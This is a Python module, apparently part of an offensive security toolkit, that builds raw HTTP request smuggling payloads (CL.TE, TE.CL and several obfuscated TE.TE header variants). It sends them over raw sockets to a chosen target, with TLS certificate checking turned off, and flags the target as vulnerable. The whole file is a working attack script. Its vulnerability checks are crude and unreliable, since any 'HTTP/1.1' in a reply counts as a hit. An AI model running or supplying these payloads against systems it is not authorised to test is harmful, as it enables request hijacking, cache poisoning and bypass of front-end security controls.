import socket
import urllib.request
import re
from utils.output import section, info, success, warning, error, result, table


class Smuggler:
    description = "HTTP Request Smuggler: CL.TE, TE.CL, TE.TE detection and exploitation"

    @staticmethod
    def run(target="", url="", port=80, tls=False, timeout=10, **kwargs):
        section("HTTP Request Smuggler")

        host = target or url or ""
        if not host:
            error("No target (use --target)")
            return {"error": "no target"}

        host = host.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        if not port:
            port = 443 if (kwargs.get("tls") or url and url.startswith("https")) else 80

        result_data = {
            "target": f"{host}:{port}",
            "cl_te": {"vulnerable": False, "detail": ""},
            "te_cl": {"vulnerable": False, "detail": ""},
            "te_te": {"vulnerable": False, "detail": ""},
        }

        section(f"Testing {host}:{port} for HTTP Smuggling")

        # CL.TE: Content-Length + Transfer-Encoding conflict
        info("Testing CL.TE...")
        cl_te_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 44\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /smuggled HTTP/1.1\r\n"
            f"X-Ignore: X\r\n"
        )

        cl_te_result = Smuggler._send_raw(host, port, cl_te_payload, timeout, tls)
        if cl_te_result and ("smuggled" in cl_te_result or "HTTP/1.1" in cl_te_result):
            result_data["cl_te"]["vulnerable"] = True
            result_data["cl_te"]["detail"] = "CL.TE: Front-end used CL, back-end used TE"
            warning("CL.TE VULNERABLE")

        # TE.CL
        info("Testing TE.CL...")
        te_cl_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST /smuggled HTTP/1.1\r\n"
            f"Content-Type: x\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )

        te_cl_result = Smuggler._send_raw(host, port, te_cl_payload, timeout, tls)
        if te_cl_result and ("smuggled" in te_cl_result or "GPOST" in te_cl_result):
            result_data["te_cl"]["vulnerable"] = True
            result_data["te_cl"]["detail"] = "TE.CL: Front-end used TE, back-end used CL"
            warning("TE.CL VULNERABLE")

        # TE.TE: obfuscated TE headers
        info("Testing TE.TE...")
        te_te_variants = [
            ("Transfer-Encoding: xchunked", "Transfer-Encoding:\r\n\tchunked"),
            ("Transfer-Encoding : chunked", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
            ("Transfer-encoding: chunked", "Transfer-Encoding: chunked\r\nTransfer-encoding: x"),
        ]

        for i, (hdr1, hdr2) in enumerate(te_te_variants):
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{hdr1}\r\n"
                f"Content-Length: 6\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            )
            result = Smuggler._send_raw(host, port, payload, timeout, tls)
            if result and ("chunked" in result.lower() or "0\r\n" in result):
                result_data["te_te"]["vulnerable"] = True
                result_data["te_te"]["detail"] = f"TE.TE variant {i+1}: header obfuscation"
                warning(f"TE.TE VULNERABLE (variant {i+1})")
                break

        if not any([result_data["cl_te"]["vulnerable"], result_data["te_cl"]["vulnerable"], result_data["te_te"]["vulnerable"]]):
            success("No HTTP smuggling vulnerabilities detected")

        section("Smuggling Scan Complete")
        return result_data

    @staticmethod
    def _send_raw(host, port, payload, timeout, tls=False):
        try:
            if tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, int(port)))
            sock.send(payload.encode() if isinstance(payload, str) else payload)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response:
                        break
                except socket.timeout:
                    break
            sock.close()
            return response.decode("utf-8", errors="replace")
        except:
            return None
